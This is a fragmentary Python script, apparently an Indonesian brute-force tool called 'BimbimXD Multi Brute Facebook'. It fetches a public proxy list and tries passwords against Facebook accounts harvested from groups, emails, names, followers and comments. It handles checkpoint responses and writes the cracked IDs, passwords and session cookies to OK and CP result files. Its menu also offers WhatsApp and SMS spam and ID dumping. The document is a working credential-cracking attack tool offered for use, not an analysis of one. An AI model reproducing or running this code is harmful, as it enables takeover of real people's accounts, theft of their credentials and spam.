...
sys.stdout.write('\x1b]2; BMBF | BimbimXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BimbimXD');exit()
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python Bimzcrack.py");followdong()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	if _____bimbim___xd____ in ['1','01']:
		...
		crack_group()
	elif _____bimbim___xd____ in ['4','04']:
		crack_email()
	elif _____bimbim___xd____ in ['5','05']:
		crack_file()
	elif _____bimbim___xd____ in ['6','06']:
		crack_nama()
	elif _____bimbim___xd____ in ['7','07']:
		pengikut()
	elif _____bimbim___xd____ in ['8','08']:
		komen()
	elif _____bimbim___xd____ in ['9','09']:
		file_cp()
	elif _____bimbim___xd____ in ['10']:
		result()
	elif _____bimbim___xd____ in ['11']:
		siu()
	elif _____bimbim___xd____ in ['12']:
		spam_wa()
	elif _____bimbim___xd____ in ['13']:
		spam_sms()
	elif _____bimbim___xd____ in ['14']:
		dumpid()
	elif _____bimbim___xd____ in ['instagram','Instagram']:
		loginCookie()
	elif _____bimbim___xd____ in ['15']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BimbimXD-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BimbimXD-OK')
					cetak(statusok1)
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Bimbim-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='Bimbim-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
